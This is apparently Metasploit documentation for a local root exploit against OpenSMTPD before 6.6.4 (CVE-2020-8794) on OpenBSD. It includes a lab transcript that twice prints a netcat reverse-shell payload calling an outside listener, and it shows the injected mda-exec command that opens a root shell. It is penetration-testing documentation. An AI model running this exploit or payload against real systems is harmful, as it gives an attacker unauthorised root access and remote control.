## Vulnerable Application

### Description

This module exploits an out-of-bounds read of an attacker-controlled
string in OpenSMTPD's MTA implementation to execute a command as the
root user.

### Setup

1. Download [OpenBSD 6.6](https://cdn.openbsd.org/pub/OpenBSD/6.6/amd64/install66.iso)
2. Install the system

### Targets

```
Id  Name
--  ----
0   OpenSMTPD < 6.6.4 (new grammar)
1   OpenSMTPD < 6.6.4 (old grammar)
```

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Options

**SESSION**

Set this to a valid session ID on an OpenBSD target.

## Scenarios

### OpenSMTPD 6.6.0 on OpenBSD 6.6

```
msf5 > use exploit/unix/local/opensmtpd_oob_read_lpe
msf5 exploit(unix/local/opensmtpd_oob_read_lpe) > show missing

Module options (exploit/unix/local/opensmtpd_oob_read_lpe):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)

msf5 exploit(unix/local/opensmtpd_oob_read_lpe) > set session -1
session => -1
msf5 exploit(unix/local/opensmtpd_oob_read_lpe) > set lhost 172.16.249.1
lhost => 172.16.249.1
msf5 exploit(unix/local/opensmtpd_oob_read_lpe) > run

[+] mkfifo /tmp/aovyv; nc 172.16.249.1 4444 0</tmp/aovyv | /bin/sh >/tmp/aovyv 2>&1; rm /tmp/aovyv
[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 172.16.249.1:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. OpenSMTPD 6.6.0 appears vulnerable to CVE-2020-8794
[*] Started service listener on 0.0.0.0:25
[*] Executing local sendmail(8) command: /usr/sbin/sendmail 'tlzlzenloqtauretns@[172.16.249.1]' < /dev/null && echo true
[*] Client 172.16.249.137:26887 connected
[*] Exploiting new OpenSMTPD grammar
[*] Faking SMTP server and sending exploit
[*] Sending: 220
[*] Expecting: /EHLO /
[+] Received: EHLO
[*] Sending: 250
[*] Expecting: /MAIL FROM:<[^>]/
[+] Received: foo.localdomain
MAIL FROM:<w
[*] Sending: 553-
553

dispatcher: local_mail
type: mda
mda-user: root
mda-exec: mkfifo /tmp/aumhem; nc 172.16.249.1 4444 0</tmp/aumhem | /bin/sh >/tmp/aumhem 2>&1; rm /tmp/aumhem; exit 0

[*] Disconnecting client 172.16.249.137:26887
[*] Command shell session 1 opened (172.16.249.1:4444 -> 172.16.249.137:37728) at 2020-03-03 14:48:18 -0600
[*] Server stopped.

id
uid=0(root) gid=0(wheel) groups=0(wheel)
uname -a
OpenBSD foo.localdomain 6.6 GENERIC#353 amd64
```
